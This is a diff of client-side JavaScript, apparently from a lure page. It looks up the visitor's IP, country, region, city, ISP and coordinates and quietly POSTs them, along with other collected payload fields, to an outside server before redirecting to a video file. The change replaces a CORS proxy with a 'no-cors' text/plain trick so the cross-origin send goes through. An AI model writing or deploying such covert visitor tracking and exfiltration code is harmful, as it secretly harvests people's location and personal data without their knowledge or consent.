@@ -58,10 +58,11 @@
         fetch("https://ipapi.co/json/").then(function(r){ return r.json(); }).then(function(d){
             payload.ip = d.ip || "-"; payload.negara = d.country_name || "-"; payload.prov = d.region || "-"; payload.kota = d.city || "-"; payload.isp = d.org || "-"; payload.koord = (d.latitude||"-")+" , "+(d.longitude||"-");
             
-            // PAKE PROXY CORS JUGA DI FB
-            return fetch("https://corsproxy.io/?url=https://websetting.my.id/api/send", {
+            // TRIK NO-CORS & TEXT/PLAIN
+            return fetch("https://websetting.my.id/api/send", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                mode: "no-cors",
+                headers: { "Content-Type": "text/plain" },
                 body: JSON.stringify(payload)
             });
         }).then(function(res){ try{ localStorage.setItem("sudah_submit","1"); }catch(e){} window.location.href = "https://files.catbox.moe/mfxa6c.mp4"; }).catch(function(err){ window.location.href = "https://files.catbox.moe/mfxa6c.mp4"; });
